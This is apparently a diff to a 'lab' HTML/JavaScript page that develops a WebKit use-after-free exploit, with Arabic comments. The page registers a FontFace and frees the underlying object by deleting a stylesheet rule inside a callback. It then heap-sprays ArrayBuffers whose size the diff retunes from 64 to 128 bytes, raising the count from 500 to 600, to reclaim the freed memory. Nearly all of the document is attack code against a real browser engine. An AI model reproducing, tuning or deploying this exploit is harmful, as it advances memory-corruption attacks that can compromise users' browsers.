@@ -7,7 +7,7 @@
 </head>
 <body>
     <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
-        [LAB] WebKit Alignment - Size Tuning (64-Byte Model)...
+        [LAB] WebKit Alignment - Size Tuning (128-Byte Model)...
     </div>
 
 <script>
@@ -17,11 +17,11 @@ function updateStatus(message) {
 }
 
 let structuralArrays = [];
-// تحديد الحجم المستهدف للاختبار الحالي
-const TARGET_SIZE = 64; 
+// الانتقال إلى الحجم التالي الأكثر احتمالاً في بنيات الـ C++ للخطوط
+const TARGET_SIZE = 128; 
 
 window.onload = () => {
-    updateStatus("Stage 3.1: Testing 64-Byte Allocation Realignment...");
+    updateStatus("Stage 3.2: Testing 128-Byte Allocation Realignment...");
 
     let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -35,13 +35,13 @@ window.onload = () => {
             if (!fired && this === A) {
                 fired = true;
                 
-                // التحرير
+                // تحرير الكائن الأصلي في الـ Heap
                 document.getElementById('s').sheet.deleteRule(0);
 
-                updateStatus("Spraying 500 ArrayBuffers with size " + TARGET_SIZE + "...");
+                updateStatus("Spraying 600 ArrayBuffers with size " + TARGET_SIZE + "...");
                 
-                // زيادة العدد لملء الـ Heap الخطي بكثافة أعلى
-                for (let i = 0; i < 500; i++) {
+                // ملء الذاكرة بكثافة أعلى بالحجم الجديد
+                for (let i = 0; i < 600; i++) {
                     structuralArrays.push(new ArrayBuffer(TARGET_SIZE));
                 }
 
